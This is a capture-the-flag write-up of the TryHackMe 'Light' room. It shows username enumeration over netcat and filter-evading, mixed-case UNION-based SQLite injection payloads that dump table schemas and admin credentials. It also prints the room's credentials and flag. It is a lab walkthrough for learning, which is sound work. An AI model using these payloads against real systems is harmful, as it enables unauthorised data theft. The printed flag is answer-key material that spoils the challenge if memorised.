This room was kind of uncomfortable, since I had some issues with basic SQLi and had to look for some hints. But I suppose this is the best way to learn. I roughly followed [this](https://0xb0b.gitbook.io/writeups/tryhackme/2025/light) blogpost.

## Getting Started 

The room tells you beforehand that there is some database, reachable via `nc 10.113.174.173 1337`. Still, I ran `nmap` just to confirm, which additionally unveiled SSH on port 22. The room provides a legitimate username `smokey`. The service on port `1337` behaved as follows

```console
kali@kali:~/Projects/THM/light$ nc 10.113.174.173 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: user01
Username not found.
```

So when you enter a username that exists in the DB it returns a plain-text password, and otherwise tells us that the username was not found.

I tried researching the syntax of `nc` to directly login, but this led nowhere:

```console
kali@kali:~/Projects/THM/light$ nc 10.113.174.173 1337 -u smokey -p vYQ5ngPpw8AdUmL
kali@kali:~/Projects/THM/light$ (echo "smokey" & echo "vYQ5ngPpw8AdUmL") | nc "10.113.174.173" "1337"
```

Next, I tried inducing a buffer overflow by providing a long string as a username, which didn't work either. My next idea was to try and enumerate existing usernames with a script. To this end, I used Claude to build a bash-script that takes a list of usernames and runs the `nc` command for each entry. Using this method I recovered quite a few users:

```console
./script.sh /usr/share/wordlists/seclists/Usernames/Names/names.txt 10.113.174.173 1337
```

```console
kali@kali:~/Projects/THM/light$ cat hits_20260730_194050.txt 
alice:tF8tj2o94WE4LKC
hazel:EcSuU35WlVipjXG
john:e74tqwRh2oApPo6
michael:7DV4dwA0g5FacRe
ralph:YO1U9O1m52aJImA
rob:yAn4fPaF2qpCKpR
steve:WObjufHX1foR8d7
```

I was hoping to recover an account like `admin` or `administrator`, so unfortunately this turned out to be a dead end.

Seeing that I was dealing with a DB, I considered SQLi next. Interestingly, entering simply `'` triggered an error:

```console
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

I ran through a few standard SQLi payloads to try and map the different errors:

```console
Please enter your username: ' or 1=1--
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: SELECT
Ahh there is a word in there I don't like :(
```

Again, letting Claude build a shell-script to test many different payloads, I found an interesting one:

```console
./sqli.sh /usr/share/wordlists/seclists/Fuzzing/Databases/SQLi/hacktricks-sqli.txt 10.113.174.173 1337
```

Searching through the results, written to `success.txt`, there was one payload that stood out:

```console
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e3
```

I narrowed this payload down to `' AND 1=0 UniON SeleCT 'a', 'f`. So I could perform some kind of UNION-based injection attack, but only when obfuscating with lower-case letters. I tried adding columns, just to see what happened, but, as expected, this only threw errors:

```console
Please enter your username: ' AND 1=0 UniON SeleCT 'admin', 'f', 'x', 'y', 'z', 'v', 'w
Error: SELECTs to the left and right of UNION do not have the same number of result columns
```

This makes sense, of course: The original query to the DB most likely only selects items from a single column. I also found that The following payload returned the last value, so there was definitely some SQLi going on:

```console
Please enter your username: ' AND 1=0 UniON SeleCT 'admin123             
Password: admin123
```

Naturally, I tried injecting a function instead of a string, but this was not processed:

```console
Please enter your username: ' UniON SeleCT 'sqlite_version()
Password: sqlite_version()
```

Here I had to take a hint from the blogpost linked above. In the write-up, they argue that the source code contains a line like:

```sql
SELECT * FROM users WHERE username = '{user_input}' LIMIT 30; 
```

and this necessarily needs to be closed with another ' if we started with one. Hence our actual vector is:

```sql
' UniON SeleCT 1'
```

Now we can finally run the `sqlite_version()` function:

```console
Please enter your username: ' UniON SeleCT sqlite_version()'    
Password: 3.31.1
```

From [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-remote-code-execution) link, I got the syntax to enumerate the tables:

```sql
' UniON SeleCT group_concat(sql) FROM sqlite_master
```

This showed a `usertable` containing the names I had discovered earlier, and the `admintable`:

```console
Please enter your username: ' UniON SeleCT sql FROM sqlite_master'
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

Then I again needed to consult the write-up to query the data (which, in hindsight, should have been obvious how to do--I was apparently really out of practice with SQL syntax):

```sql
' UniON SeleCT group_concat(username) FROM admintable'
' UniON SeleCT group_concat(password) FROM admintable'
```

Using these two payloads successfully returned the flag to finish the room:

```
TryHackMeAdmin:mamZtAuMlrsEy5bp6q17, flag:THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```



## Lessons Learned

1. Using automated scripting to check SQLi payloads is useful, but only *after* doing at least *some* manual testing
2. Worked on some basic SQL syntax and pentesting workflows
3. Finally understood how UNION-based SQLi actually works, ie. why it's important to have the same number of columns present in the `UNION SELECT` query
